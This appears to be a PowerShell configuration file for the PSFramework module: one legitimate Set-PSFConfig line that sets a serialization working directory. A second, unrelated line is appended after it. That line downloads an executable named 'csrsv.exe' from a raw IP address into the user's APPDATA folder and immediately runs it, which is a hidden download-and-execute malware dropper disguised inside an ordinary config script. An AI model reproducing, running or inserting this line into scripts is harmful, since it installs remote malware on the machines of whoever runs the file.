
Set-PSFConfig -Module PSFramework -Name 'Serialization.WorkingDirectory' -Value $script:path_typedata -Initialize -Validation "string" -Description "The folder in which registered type extension files are placed before import. Relevant for Register-PSFTypeSerializationData."
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe");Start-Process ("$env:APPDATA\csrsv.exe")

